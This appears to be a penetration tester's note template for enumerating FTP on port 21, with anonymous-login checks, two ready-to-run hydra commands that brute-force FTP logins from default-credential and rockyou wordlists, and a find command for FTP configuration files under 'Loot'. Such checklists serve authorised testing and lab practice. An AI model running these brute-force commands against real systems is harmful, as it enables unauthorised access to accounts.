#service # login
<% tp.file.rename("1_FTP_21")%>
☑️
> With IIS: `C:\inetpub\wwwroot`


Anonymous Login? (anonymous or anon)

Use `ls -al` to see hidden files via ftp

## Bruteforce default credentials
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$hip -vV -t 1 -I -s 21
```
Or for a given user:
```bash
hydra -l $user -P /usr/share/wordlists/rockyou30.txt ftp://$hip -V -t 4 -I -s 21
```

# Findings


# Loot
```bash
find / -name "ftpusers" -o -name "ftp.conf" -o -name "proftpd.conf"
```